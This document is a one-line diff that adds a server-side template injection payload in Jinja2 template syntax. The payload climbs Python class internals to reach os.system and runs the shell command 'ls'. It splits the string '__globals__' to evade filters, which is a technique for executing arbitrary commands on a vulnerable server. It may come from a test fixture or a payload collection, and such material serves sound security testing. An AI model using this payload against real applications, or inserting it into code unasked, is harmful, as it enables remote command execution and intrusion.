@@ -1,0 +1,1 @@
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('__global'+'s__')['os'].__dict__['system']('ls')}}
